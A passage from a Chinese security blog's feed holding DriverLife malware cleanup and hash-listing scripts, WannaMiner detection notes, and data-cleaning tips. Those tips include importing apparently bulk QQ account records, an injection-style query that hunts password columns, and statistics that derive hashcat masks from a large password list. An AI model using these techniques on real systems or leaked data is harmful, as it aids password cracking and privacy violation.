Terminate |Out-Nullwrite-host [i] delete Forward -ForegroundColor Greennetsh interface portproxy delete v4tov4 listenport=65531 |Out-Nullnetsh interface portproxy delete v4tov4 listenport=65532 |Out-Nullwrite-host [i] delete user:k8h3d -ForegroundColor Greencmd.exe /c "net user k8h3d /del 2&gt;nul" |out-null##cmd.exe /c "taskkill -im powershell.exe /f 2&gt;nul" 其它相关md5 以及签名证书信息12345678910111213141516171819202122232425262728293031323334353637383940function check_Signer&#123; Param ( $evil_file )$Signature=Get-AuthenticodeSignature $evil_file -ErrorAction 0$Signature_Thumbprint= $Signature.SignerCertificate.Thumbprint$cn=$Signature.SignerCertificate.Subject$md5=(_calc_md5 $evil_file).hash$retVals = New-Object -TypeName psobject -Property @&#123; Signature = $cn File = $evil_file Thumbprint=$Signature_Thumbprint MD5=$md5 &#125;return $retVals&#125;function _calc_md5&#123; Param($path) if($path -ne $null)&#123; if(Test-Path $path -PathType Leaf )&#123; try&#123; $fs=(new-object system.io.fileinfo($path)).openread(); $r=(new-object system.security.cryptography.md5cryptoserviceprovider).computehash($fs);$fs.close(); [string]$hash=[bitconverter]::tostring($r).replace('-','') &#125;catch&#123;&#125; $retVal = New-Object -TypeName psobject -Property @&#123; Path = $path Hash = $hash &#125; return $retVal &#125; &#125; else&#123; write-host [-] '_calc_md5' $path -ForegroundColor Yellow &#125;&#125;ls *.exe |% &#123;check_Signer $_.FullName&#125;|Select-Object MD5,Thumbprint,File,Signature|Sort-Object Thumbprint |ft -AutoSize |Out-String -Width 99999 |Out-File infos.txt 123456789101112131415161718192021222324252627282930313233343536MD5 Thumbprint File Signature --- ---------- ---- --------- D80CFB955B1881F89BDC249B1844F612 C:\test\DriverLife\svchost1x.exe 96BDB44E072122EE05FB8E729063463C C:\test\DriverLife\svchostb.exe CCE36235A525858EB55070847296C4C8 C:\test\DriverLife\svchost1.exe BC26FD7A0B7FE005E116F5FF2227EA4D C:\test\DriverLife\svchos3t.exe 96BDB44E072122EE05FB8E729063463C C:\test\DriverLife\svchost.exe DF79BC5E41426BB87FE725554DD76A6E C:\test\DriverLife\svvhost1.exe 9911858E9BEC100CCF6D8134915103EC C:\test\DriverLife\svvhost2.exe DF79BC5E41426BB87FE725554DD76A6E C:\test\DriverLife\svvhost.exe 9911858E9BEC100CCF6D8134915103EC C:\test\DriverLife\svchost_1.exe D758AA69BC07881C136ED68A38B7BEEC C:\test\DriverLife\svcxhostex.exe 0D3B854DFF7EABCC0A834F268392F3A1 C:\test\DriverLife\svchostx.exe 17F6582FE231831512E7CA90AC3BB97C C:\test\DriverLife\log.exe 2574D2B7CE00510323F18777EAF9F289 C:\test\DriverLife\lduwsx.exe 6983F7001DE10F4D19FC2D794C3EB534 C:\test\DriverLife\liqegykg.exe 6983F7001DE10F4D19FC2D794C3EB534 C:\test\DriverLife\nidofopt.exe 6983F7001DE10F4D19FC2D794C3EB534 C:\test\DriverLife\jheikvql.exe 59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\updatec.exe CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN 59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\update.exe CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN FB89D40E24F5FF55228C38B2B07B2E77 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\updatedlxxxx.exe CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN FB89D40E24F5FF55228C38B2B07B2E77 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\updatedl.exe CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN 59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\updll2.exe CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN 59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\updlld.exe CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN 59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\updll.exe CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN D4E2EBCF92CF1B2E759FF7CE1F5688CA 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\taskmgr.exe CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN 637BF46077AD083659D3B96A010F38FE 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\wmiex.exe CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN 59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\svchost2.exe CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN 59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\setup-install.exe CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN 59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\installed.exe CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN 59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\setup-installa.exe CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN 74E2A43B2B7C6E258B3A3FC2516C1235 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\svhhost2.exe CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN 66EA09330BEE7239FCB11A911F8E8EA3 26E740973E7C575A9B8D0B03521F7D96CE9F3E4D C:\test\DriverLife\mn.exe CN=&quot;Shenzhen Qitu Software Technolgy Co., Ltd.&quot;, OU=Digital ID Class 3 - Microsoft Software Validation v2, O=&quot;Shenzhen Qitu Software Technolgy Co., Ltd.&quot;, L=Shenzhen, S=Guangdong, C=CN470B4F5BC84DB74AB1935186A3B5219F 78A149F9A04653B01DF09743571DF938F9873FA5 C:\test\DriverLife\ii.exe CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN D81233988EC80F56EA4094BAD7AB5814 FBA6E6001B3AB7C29C70A943AA0F45D911C487EA C:\test\DriverLife\yjgqsinx.exe CN=Shenzhen Le Zhuo Software Technologies Ltd., OU=Digital ID Class 3 - Microsoft Software Validation v2, O=Shenzhen Le Zhuo Software Technologies Ltd., L=Shenzhen, S=Guangdong, C=CN D81233988EC80F56EA4094BAD7AB5814 FBA6E6001B3AB7C29C70A943AA0F45D911C487EA C:\test\DriverLife\yjgqsin.exe CN=Shenzhen Le Zhuo Software Technologies Ltd., OU=Digital ID Class 3 - Microsoft Software Validation v2, O=Shenzhen Le Zhuo Software Technologies Ltd., L=Shenzhen, S=Guangdong, C=CN 多次应急收集到的所有样本DriverLife.zip 感兴趣的同学可以研究下]]></content>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WannaMiner 挖矿木马手工检测笔记]]></title>
    <url>%2F2019%2F03%2F06%2FWannaMiner-chek%2F</url>
    <content type="text"><![CDATA[发现可疑进程:外部扫描: 该木马通常会开启65531-65533 端口 nmap -p65531-65533 --open -oG d:\result1.txt 10.230.12.1/16 过滤出受影响IP：grep -oE &quot;\b([0-9]{1,3}\.){3}[0-9]{1,3}\b&quot; 230-result1.txt 恶意端口对应进程:恶意进程对应服务:对应服务名:snmpstorsrv 恶意服务详情 服务加载模块 加载dll:snmpstorsrv.dll 加载恶意模块位置 dll位置:C:\Windows\system32\snmpstorsrv.dll dll模块对应的md5 MD5:42A12DE5A2B8CFF827407877DBD66B16360威胁情报查看确实有相应的威胁情报信息，并有相关安全报道 查看文件创建日期Get-Item C:\Windows\system32\snmpstorsrv.dll 2009/7/14 9:39 修改过文件时间不准确 导出注册表查看服务创建日期服务创建日期:2018/11/16 - 18:17 更详细快捷的查杀建议使用pchunter 火绒剑 auturuns等安全工具]]></content>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据清洗杂项]]></title>
    <url>%2F2019%2F03%2F05%2FData-cleaning%2F</url>
    <content type="text"><![CDATA[0x01 正则基础POSIX字符组 POSIX字符组 说明 范围 [[:alnum:]] 字母字符和数字字符 [a-zA-Z0-9] [[:alpha:]] 字母 [a-zA-Z] [[:ascii:]] ASCII字符 [\x00-\x7F] [[:blank:]] 空格字符和制表符 [ \t] [[:cntrl:]] 控制字符 [\x00-\x1F\x7F] [[:digit:]] 数字字符 [0-9] [[:graph:]] 空白字符之外的字符 [\x21-\x7E] [[:lower:]] 小写字母字符 [a-z] [[:print:]] [:graph:]和空白字符 [\x20-\x7E\] [[:punct:]] 标点符号 []!&quot;\#$%&amp;&#39;\()*+,./:;&lt;=&gt;? @^_{|\}~-] [[:space:]] 空白字符 [ \t\r\n\v\f] [[:upper:]] 大写字母字符 [A-Z] [[:xdigit:]] 十六进制字符 [A-Fa-f0-9] 正反向预查 字符组 说明 (?:pattern) 匹配pattern但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用或字符(|)来组合一个模式的各个部分是很有用。例如industr(?:y|ies)就是一个比industry|industries更简略的表达式。 (?=pattern) 正向肯定预查，在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，Windows(?=95|98|NT|2000)能匹配Windows2000中的Windows，但不能匹配Windows3.1中的Windows。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。 (?!pattern) 正向否定预查，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如Windows(?!95|98|NT|2000)能匹配Windows3.1中的Windows，但不能匹配Windows2000中的Windows。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始 (?&lt;=pattern) 反向肯定预查，与正向肯定预查类拟，只是方向相反。例如，(?&lt;=95|98|NT|2000)Windows能匹配2000Windows中的Windows，但不能匹配3.1Windows中的Windows。 (?&lt;!pattern) 反向否定预查，与正向否定预查类拟，只是方向相反。例如(?&lt;!95|98|NT|2000)Windows能匹配3.1Windows中的Windows，但不能匹配2000Windows中的Windows。 测试代码1234567891011121314151617181920212223242526preg_match('#Windows(?=2000|XP|7)#', 'WindowsXP', $matchResult1);preg_match('#Windows(?=2000|XP|7)#', 'Windows7', $matchResult2);preg_match('#Windows(?=2000|XP|7)#', 'Windows2000', $matchResult3);preg_match('#Windows(?=2000|XP|7)#', 'Windows2008', $matchResult4);//高级点preg_match('#Win\w+(?=2000|XP|7)#', 'Windows2000', $matchResult5);preg_match('#Win\w+(?=2\d+)#', 'Windows2006', $matchResult6);preg_match('#Win\w+(?=2\d+)#', 'Windows2007', $matchResult7);preg_match('#Win\w+(?=2\d+)#', 'Windows2008', $matchResult8);preg_match('#Win\w+(?=2\d+)#', 'Windows3008', $matchResult9);header('Content-type:text/plain');print_r([ $matchResult1[0], //Windows $matchResult2[0], //Windows $matchResult3[0], //Windows $matchResult4, //匹配失败 $matchResult5[0], //Windows $matchResult6[0], //Windows $matchResult7[0], //Windows $matchResult8[0], //匹配失败 $matchResult9, //匹配失败]); 反向预查这个思维是相反的，比如Windows(?!2000|XP|7)不能匹配Windows7、Windows2000、WindowsXP里的Windows，却能匹配Windows2008里的Windows，例子就不做了，关键符号就是?! 0x02 字符处理编码转换 编码不正确会导致 各种莫名奇妙的问题 乱码 甚至 编辑的时候卡住 或 报错所有第一步就是要将转换编码 123enca -L zh_CN.UTF-8 baidu.txt #查看该文本编码iconv -c -f GB2312 -t utf-8 #转换方法1enca -L zh_CN.UTF-8 -c #方法2 自动转换 当然也可以直接 iconv -c -f ASCII -t ASCII test.txt 转换成 unix 格式(转换换行符)dos2unix 当然也可以用tr ,sed 导入数据报错ERROR 1300 (HY000): Invalid utf8 character string: 12345mysql&gt; SET character_set_client = utf8mb4; mysql&gt; SET character_set_results = utf8mb4; mysql&gt; SET character_set_connection = utf8mb4; mysql&gt; SET character_set_server = utf8mb4;mysql&gt; SET character_set_database = utf8mb4; 剔除无效字符及空行1sed -e 's/[\x01-\x19]//g' -e 's/\x00/ /g' -e 's/[\x1a-\x1f]//g' -e 's/^[ \t]*//' -e 's/[ \t]*$//' 当然也可以使用 1grep -a -v '[[:cntrl:]]' #处理不够干净 还是喜欢用上面的方法 去除重复sort baidu.log | uniq #测试该方法是我所知的最快的 缺点就是只是按照开头字符排序awk &quot;{print length($1),$1}&quot; file.txt | sort -n | awk &quot;{print $2}&quot; 字符串按照长度排序(短-&gt;长) 很慢 清洗案例 如下数据中152221111null 由于导出数据库时替换问题缺少引号导致无法导入数据库 12INSERT INTO OT_FORMH VALUES('554354353', null, '武汉武昌', '周杰伦', '152221111null,'666666666666', null, 'HEHE', null, 'hahah', 'ddddd', null, null, null); 修复后： 12INSERT INTO OT_FORMH VALUES('554354353', null, '武汉武昌', '周杰伦', '152221111','666666666666', null, 'HEHE', null, 'hahah', 'ddddd', null, null, null); 语句 1sed -i "s/null\([[:alnum:]]\)/\1/" a.txt 数据 1INSERT INTO OT_FORMH VALUES('54534543535', '302', '武汉武昌', '马培月', '6757657', '546565469879', null, null, null, null, 'fd', null7657657', null, null); null7657657&#39; 缺少引号,多一个null 修复语句 1sed -i "s/null\([[:alnum:]]\)/\'\1/" a.txt 问题数据 1INSERT INTO OT_FORMH VALUES('564654654', '302', '武汉华东师范大学,a栋302', '马晓晓', '15678123456', '999999', null, null, null, null, 'HUAWEI', 543535', null, null); 0937536518&#39; 缺少单引号，武汉华东师范大学,逗号也需要考虑 修复命令 1cat a.txt |sed "s/,\s\([[:digit:]]\&#123;5,\&#125;',\)/ ,'\1/g" 名字如：Tobey &#39;s 包含单引号造成sql执行错误问题数据 12INSERT INTO OT_FORMH VALUES(&apos;xxxxxxxx&apos;, &apos;807&apos;, &apos;厦门市&apos;, &apos;Tom&apos;s xxxxx&apos;, &apos;777777&apos;, &apos;0694013143&apos;, &apos;xxxxx&apos;, null, null, null, &apos;100050&apos;, &apos;073222138&apos;, null, null); INSERT INTO OT_FORMH VALUES(&apos;UEU117022513079&apos;, &apos;106&apos;, &apos;ddddd Ce&apos;Tive&apos;, &apos;林月月&apos;, &apos;09276576510&apos;, &apos;800056033355&apos;, &apos;ddddddd&apos;, null, null, null, &apos;200004&apos;, null, &apos;丹东&apos;, null); 修复命令 1cat f.txt |sed &quot;s/\([^( ]\)&apos;\([[:alpha:]]\)/\1 \2/g&quot; 涉及知识点: &amp; 元字符是有用的，但更有用的功能是能够在正则表达式中定义特定区域，通过定义正则表达式的特定的一部分，您可以引用字符引用这部分。反向引用时,你必须首先定义一个区域,然后回顾这个区域。定义一个区域是在你感兴趣的区域插入\和括号。你周围的第一区域被通过\1引用,第二个地区用 \2引用，等等。 替换所有不包含;符号换行，并重新换行 1cat a.txt | sed ':a;N;$!ba;s/[\r\n]/ /g' |sed 's/\;/;\r\n/g' &gt;a1.txt 剔除多余的单引号 123456cat ff.txtINSERT INTO CU_AAA VALUES(&apos;5345435&apos;, &apos;65467457&apos;);INSERT INTO CU_AAA VALUES(&apos;5435435&apos;, &apos;&apos;6546543&apos;);INSERT INTO CU_AAA VALUES(&apos;5354354&apos;, &apos;5345345&apos;);INSERT INTO CU_AAA VALUES(&apos;543543543&apos;, &apos;&apos;);INSERT INTO CU_AAA VALUES(&apos;&apos;, &apos;5435435&apos;); 1cat tel1.txt|sed '/\'\')/!s/\'\'/\'/g' &gt;tel2.txt 剔除无意义字符 1sed -e 's/[^[:print:]]//g' -e 's/\xef//g' -e 's/\xbf//g' -e 's/\xbd//g' 导入数据库mysql -uroot -proot -Ddddd --default_character_set utf8 &lt;sql.txt 常见grep匹配查找email 1grep -b -a -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&#123;2,6&#125;\b" 匹配 &lt;h1 class=&quot;page-title&quot;&gt;之间字符 1grep -oP '(?&lt;=&lt;h1 class="page-title"&gt;).*?(?=&lt;\/h1&gt;)' 0x04 oracle aes解密使用mysql123456789## 解密SET block_encryption_mode = 'aes-256-cbc';SET @init_vector = UNHEX('00000000000000000000000000000000');SELECT AES_DECRYPT(unhex('39B84FD13BF16DC7813CGB3D4A113685'),upper(md5('key-text')),@init_vector);##或直接keySELECT AES_DECRYPT(unhex('39B84FD13BF16DC7813CGB3D4A113685'),'KEY0000000000000',@init_vector);##加密select HEX(AES_ENCRYPT('54353453453', 'KEY', @init_vector)); 使用php123456789function encryptNew($str, $key)&#123; return bin2hex(openssl_encrypt($str, 'AES-256-ECB', $key, OPENSSL_RAW_DATA));&#125;function decryptNew($encryptedStr, $key)&#123; return openssl_decrypt(hex2bin($encryptedStr), 'AES-256-ECB', $key, OPENSSL_RAW_DATA);&#125; 0x05 其他导库笔记快速显示某一行：cat sql.txt | head -n 981 | tail -n +981sed -n &#39;5243,5245p&#39; mysql 相关mysql导入大数据处理set global slave_net_timeout=3600;SET GLOBAL max_allowed_packet=1073741824;select @@max_allowed_packet 快速导库 先导库后创索引要快得多load data infile 很快 load data infile &#39;/var/lib/mysql-files/CU_AAA.txt&#39; IGNORE into table CUST_TEL fields terminated by &#39;&lt;terminated&gt;&#39;; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141CREATE TABLE `qqinfo`.`qqinfo` ( `ID` INT NOT NULL , `QQNum` INT NOT NULL , `Nick` VARCHAR(20) NULL , `QunNum` VARCHAR(45) NULL , PRIMARY KEY (`ID`) )ENGINE = MyISAMDEFAULT CHARACTER SET = utf8COLLATE = utf8_general_ci;##修改字段编码alter table `qqinfo` CHANGE `Nick` `Nick` VARCHAR(45) CHARACTER SET utf8 COLLATE utf8_binload data infile 'H:\\mysql\\sql.txt' into table qqinfo fields terminated by ':' (ID,QQNum,Nick,QunNum);##设置 所有编码 set names utf8;##查看编码show variables like 'character%';##修改数据库编码alter database `qqinfo` DEFAULT CHARACTER SET utf8 COLLATE utf8_binalter database `qqinfo` DEFAULT CHARACTER SET gbk COLLATE gbk_chinese_ciALTER DATABASE `db_name` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;##修改表编码use qqinfo;alter table `qqinfo` default character set utf8 collate utf8_bin;##注：1.UTF8不要导入gbk，gbk不要导入UTF8;##都在界面下设置好1 hour 26 min 38.72 secCREATE INDEX ix_QQNum ON qqinfo (QQNum) 创建索引CREATE TABLE `qqinfo` ( `ID` int(11) NOT NULL, `QQNum` int(11) NOT NULL, `Nick` char(12) DEFAULT NULL, `QunNum` int(11) DEFAULT NULL, PRIMARY KEY (`ID`)) ENGINE=MyISAM DEFAULT CHARSET=gb2312;CREATE INDEX idx_qqinfo ON qqinfo (QQNum,QunNum);ALTER TABLE qqinfo ADD INDEX index_qqinfo_QQNum_QunNum (QQNum,QunNum);set GLOBAL innodb_flush_log_at_trx_commit = 0##先建索引，再执行set GLOBAL innodb_flush_log_at_trx_commit = 0;再倒入数据；innodb_flush_log_at_trx_commitinnodb_buffer_pool_size如果用Innodb，那么这是一个重要变量。相对于MyISAM来说，Innodb对于buffer size更敏感。MySIAM可能对于大数据量使用默认的key_buffer_size也还好，但Innodb在大数据量时用默认值就感觉在爬了。 Innodb的缓冲池会缓存数据和索引，所以不需要给系统的缓存留空间，如果只用Innodb，可以把这个值设为内存的70%-80%。和 key_buffer相同，如果数据量比较小也不怎么增加，那么不要把这个值设太高也可以提高内存的使用率。innodb_additional_pool_size 这个的效果不是很明显，至少是当操作系统能合理分配内存时。但你可能仍需要设成20M或更多一点以看Innodb会分配多少内存做其他用途。innodb_log_file_size对于写很多尤其是大数据量时非常重要。要注意，大的文件提供更高的性能，但数据库恢复时会用更多的时间。我一般用64M-512M，具体取决于服务器的空间。innodb_log_buffer_size 默认值对于多数中等写操作和事务短的运用都是可以的。如 果经常做更新或者使用了很多blob数据，应该增大这个值。但太大了也是浪费内存，因为1秒钟总会 flush（这个词的中文怎么说呢？）一次，所以不需要设到超过1秒的需求。8M-16M一般应该够了。小的运用可以设更小一点。innodb_flush_log_at_trx_commit （这个很管用） 抱怨Innodb比MyISAM慢 100倍？那么你大概是忘了调整这个值。默认值1的意思是每一次事务提交或事务外的指令都需要把日志写入（flush）硬盘，这是很费时的。特别是使用电 池供电缓存（Battery backed up cache）时。设成2对于很多运用，特别是从MyISAM表转过来的是可以的，它的意思是不写入硬盘而是写入系统缓存。日志仍然会每秒flush到硬 盘，所以你一般不会丢失超过1-2秒的更新。设成0会更快一点，但安全方面比较差，即使MySQL挂了也可能会丢失事务的数据。而值2只会在整个操作系统 挂了时才可能丢数据。 每个MyISAM在磁盘上存储成三个文件。第一个文件的名字以表的名字开始，扩展名指出文件类型。.frm文件存储表定义。数据文件的扩展名为.MYD (MYData)。索引文件的扩展名是.MYI (MYIndex)。mysql 状态SHOW STATUS like '_cache%'mysql&gt; show variables like '%tmp%';+----------------------------+-------------------------------------------------+| Variable_name | Value |+----------------------------+-------------------------------------------------+| default_tmp_storage_engine | InnoDB || max_tmp_tables | 32 || slave_load_tmpdir | C:\Windows\SERVIC~2\NETWOR~1\AppData\Local\Temp || tmp_table_size | 57671680 || tmpdir | C:\Windows\SERVIC~2\NETWOR~1\AppData\Local\Temp |+----------------------------+-------------------------------------------------+ show global status 优化相关 http://wenku.baidu.com/link?url=wPDRuX34e7Z8o-JJG5BT7Tu1gq43c5ZS2X8_2IRnlSrniYUTxMsPk_Hz8Pqw3FxFE0v3tiKO-Sr_Jumn6bZAIYbZMWo5BAFg9rJkJEfD75e http://blog.chinaunix.net/uid-24145780-id-125159.html 复制表 CREATE TABLE `qqinfo_1` ( `ID` int(11) NOT NULL AUTO_INCREMENT, `QQNum` int(11) NOT NULL, `Nick` char(20) DEFAULT NULL, `QunNum` int(11) DEFAULT NULL, PRIMARY KEY (`ID`), KEY `inx_qqinfo` (`QQNum`,`QunNum`) USING HASH) ENGINE=MyISAM AUTO_INCREMENT=179780305 DEFAULT CHARSET=gbk DELAY_KEY_WRITE=1; insert into qqinfo_1 (`QQNum`,`Nick`,`QunNum`) select `QQNum`,`Nick`,`QunNum` from qqinfo.qqinfo; mysql 导库指定编码不易出错mysql -uroot --default-character-set=utf8 net &lt; net.txt mysqldump -h 127.0.0.1 -uroot -proot --opt --skip-lock-tables --default-character-set=utf8 net1 members &gt;/data/www/pmxy/data/net1.txtmysql中所有库查找包含某个字段的表 如 passwordselect table_schema,table_name,column_name from information_schema.columns where table_schema !=0x696E666F726D6174696F6E5F736368656D61 and table_schema !=0x6D7973716C and table_schema !=0x706572666F726D616E63655F736368656D61 and (column_name like '%pass%' or column_name like '%pwd%'); load data infile 比source 及直接导入sql 文件快无数倍！强烈建议使用 0x06 字符统计筛选 以下内容来源t00ls.net @download 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188//整理字符集为键盘上的字符5-30位的密码grep -o -P "[[:lower:][:upper:][:digit:][:punct:] ]+" 2014_1_last | awk '&#123;if(length($0) &gt; 4 &amp;&amp; length($0) &lt; 31) print $0&#125;' &gt;&gt; 2014_1_last_//删除1-7位的纯大写、1-7位的纯小写、1-9位的纯数字sed "/^[[:upper:]]\&#123;1,7\&#125;$/d;/^[[:lower:]]\&#123;1,7\&#125;$/d;/^[[:digit:]]\&#123;1,9\&#125;$/d;" 2014_1_last_ &gt;&gt;2014_1_last__//hashcat_masks 排名sed 's/[[:lower:]]/l/g;s/[[:upper:]]/u/g;s/[[:digit:]]/d/g;s/[[:punct:] ]/s/g' 2014_1_last__ | sort | uniq -c | sort -nr &gt;&gt;2014_1_last__hashcat_masks_sus//hashcat_masks 将luds前边加 ?sed 's/\([luds]\)/?\0/g;' 2014_1_last__hashcat_masks_sus //密码长度排名1、awk '&#123;printf("%s %s %s\r\n",$1,length($2),$2)&#125;' 2014_1_last__hashcat_masks_sus &gt;&gt;2014_1_last__hashcat_masks_sus_length2、awk '&#123;a[$2]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;' 2014_1_last_x_hashcat_masks_sus_length | sort -nr -k211 2528116010 1534223112 1104737914 979497413 91058539 872658315 68641878 661766116 62353607 18481346 89923317 8355118 4017419 3220221 1264920 884722 221623 182424 133325 92728 91826 82927 73329 40030 2555 28//长度百分比排名$ awk '&#123;a[$2]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;' 2014_1_last__hashcat_masks_sus_length | awk '&#123;a[NR]=$1;b[NR]=$2;s+=$2&#125;END&#123;for(j=1;j&lt;NR+1;j++) printf "%s\t%.5f%\n",a[j],b[j]*100/s&#125;' 2014_1_last__length_sus | sort -nr -k211 24.79769%10 15.04883%12 10.83611%14 9.60766%13 8.93172%9 8.55970%15 6.73292%8 6.49111%16 6.11612%7 1.81279%6 0.88204%17 0.08195%18 0.03941%19 0.03159%21 0.01241%20 0.00868%22 0.00217%23 0.00179%24 0.00131%25 0.00091%28 0.00090%26 0.00081%27 0.00072%29 0.00039%30 0.00025%5 0.00003%-----------------------------------//同时包含四种字符的排序$ grep '[u]' 2014_1_last_x_hashcat_masks_sus | grep '[d]' | grep '[l]' | grep '[s]' | head -n 10 | nl 1 1074 ullsdddd 2 963 ulllsdddd 3 834 ullsdddddd 4 807 ulldddds 5 800 ullllsdddd 6 735 uldddddds 7 735 ulddddddddddds 8 715 ulldddddds 9 703 ulddddddds 10 687 ullldddds//同时包含大小写数字的排序$ grep '[u]' 2014_1_last__hashcat_masks_sus | grep '[d]' | grep '[l]' | grep '[^s]' | head -n 10 | nl 1 14383 ulldddddd 2 13679 uldddddd 3 11557 ulldddddddd 4 11054 uldddddddd 5 11003 ulddddddddddd 6 10521 ullldddd 7 10099 ullddddddd 8 10060 ullddddddddddd 9 9967 ulddddddd 10 9264 ulllldddd//同时包含大小写的排序$ grep '[u]' 2014_1_last__hashcat_masks_sus | grep '[l]' | grep '[^d]' | grep '[^s]' | head -n 10 | nl 1 14383 ulldddddd 2 13679 uldddddd 3 11557 ulldddddddd 4 11054 uldddddddd 5 11003 ulddddddddddd 6 10521 ullldddd 7 10099 ullddddddd 8 10060 ullddddddddddd 9 9967 ulddddddd 10 9264 ulllldddd//连续的纯字符的排序$ sed -n '/\b\([luds]\)\1*$/p' 2014_1_last__hashcat_masks_sus16406454 ddddddddddd5475964 dddddddddd2129702 dddddddddddd1189570 dddddddddddddd 822811 llllllllll 734170 lllllllll 658042 ddddddddddddd 653511 llllllll 643282 lllllllllll 606358 dddddddddddddddd 570914 llllllllllll//统计开头的第一个字母的数量排序$ awk '&#123;a[substr($3,1,1)]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;' 2014_1_last__hashcat_masks_sus_length | sort -nr -k2//统计开头的第二个字母的数量排序$ awk '&#123;a[substr($3,2,1)]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;' 2014_1_last__hashcat_masks_sus_length | sort -nr -k2//统计开头的第三个字母的数量排序$ awk '&#123;a[substr($3,3,1)]+=$1;&#125;END&#123;for(i in a)&#123;&#123;print i" "a[i];&#125;&#125;&#125;' 2014_1_last__hashcat_masks_sus_length | sort -nr -k2//统计开头的前二个字母的数量排序$ awk 